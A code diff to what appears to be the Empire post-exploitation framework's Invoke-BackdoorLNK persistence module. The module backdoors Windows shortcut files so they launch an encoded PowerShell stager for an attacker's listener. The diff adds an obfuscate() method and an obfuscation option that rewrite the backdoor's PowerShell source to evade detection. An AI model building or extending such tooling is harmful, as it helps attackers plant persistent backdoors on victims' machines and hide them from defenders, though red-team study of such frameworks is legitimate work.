@@ -1,3 +1,4 @@
+import os.path
 from lib.common import helpers
 
 class Module:
@@ -14,13 +15,13 @@ class Module:
             'Background' : True,
 
             'OutputExtension' : None,
-            
+
             'NeedsAdmin' : False,
 
             'OpsecSafe' : False,
-            
+
             'MinPSVersion' : '2',
-            
+
             'Comments': [
                 'http://windowsitpro.com/powershell/working-shortcuts-windows-powershell',
                 'http://www.labofapenetrationtester.com/2014/11/powershell-for-client-side-attacks.html',
@@ -91,8 +92,8 @@ class Module:
                 self.options[option]['Value'] = value
 
 
-    def generate(self):
-        
+    def generate(self, obfuscate=False, obfuscationCommand=""):
+
         listenerName = self.options['Listener']['Value']
 
         # management options
@@ -121,9 +122,12 @@ class Module:
             launcher = launcher.replace("$", "`$")
 
 
-        # read in the common powerup.ps1 module source code
+        # read in the common module source code
         moduleSource = self.mainMenu.installPath + "/data/module_source/persistence/Invoke-BackdoorLNK.ps1"
-
+        if obfuscate:
+            moduleSource = self.mainMenu.installPath + "/data/obfuscated_module_source/persistence/Invoke-BackdoorLNK.ps1"
+            if not self.is_obfuscated():
+                self.obfuscate(obfuscationCommand=obfuscationCommand)
         try:
             f = open(moduleSource, 'r')
         except:
@@ -134,16 +138,16 @@ class Module:
         f.close()
 
         script += "Invoke-BackdoorLNK "
-        
+
         if cleanup.lower() == "true":
             script += " -CleanUp"
             script += " -LNKPath '%s'" %(lnkPath)
             script += " -RegPath '%s'" %(regPath)
             script += "; \"Invoke-BackdoorLNK cleanup run on lnk path '%s' and regPath %s\"" %(lnkPath,regPath)
-       
+
         else:
             if extFile != '':
-                # read in an external file as the payload and build a 
+                # read in an external file as the payload and build a
                 #   base64 encoded version as encScript
                 if os.path.exists(extFile):
                     f = open(extFile, 'r')
@@ -168,7 +172,7 @@ class Module:
                 else:
                     # generate the PowerShell one-liner with all of the proper options set
                     launcher = self.mainMenu.stagers.generate_launcher(listenerName, encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
-                    
+
                     encScript = launcher.split(" ")[-1]
                     statusMsg += "using listener " + listenerName
 
@@ -177,3 +181,33 @@ class Module:
             script += "; \"Invoke-BackdoorLNK run on path '%s' with stager for listener '%s'\"" %(lnkPath,listenerName)
 
         return script
+
+    def obfuscate(self, obfuscationCommand="", forceReobfuscation=False):
+        if self.is_obfuscated() and not forceReobfuscation:
+            return
+
+        # read in the common module source code
+        moduleSource = self.mainMenu.installPath + "/data/module_source/persistence/Invoke-BackdoorLNK.ps1"
+        try:
+            f = open(moduleSource, 'r')
+        except:
+            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
+            return ""
+
+        moduleCode = f.read()
+        f.close()
+
+        # obfuscate and write to obfuscated source path
+        obfuscatedSource = self.mainMenu.installPath + "/data/obfuscated_module_source/persistence/Invoke-BackdoorLNK.ps1"
+        obfuscatedCode = helpers.obfuscate(psScript=moduleCode, installPath=self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
+        try:
+            f = open(obfuscatedSource, 'w')
+        except:
+            print helpers.color("[!] Could not read obfuscated module source path at: " + str(obfuscatedSource))
+            return ""
+        f.write(obfuscatedCode)
+        f.close()
+
+    def is_obfuscated(self):
+        obfuscatedSource = self.mainMenu.installPath + "/data/obfuscated_module_source/persistence/Invoke-BackdoorLNK.ps1"
+        return os.path.isfile(obfuscatedSource)
